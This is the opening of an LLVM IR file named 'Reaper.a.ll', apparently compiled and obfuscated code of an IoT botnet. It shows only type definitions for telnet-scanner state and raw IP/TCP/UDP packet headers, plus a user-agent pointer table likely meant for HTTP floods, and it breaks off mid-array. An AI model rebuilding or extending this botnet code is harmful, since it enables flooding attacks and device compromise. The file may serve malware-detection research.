; ModuleID = 'host/ir_fla/Reaper.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@UserAgents = global [789 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.194, i32 0, i32 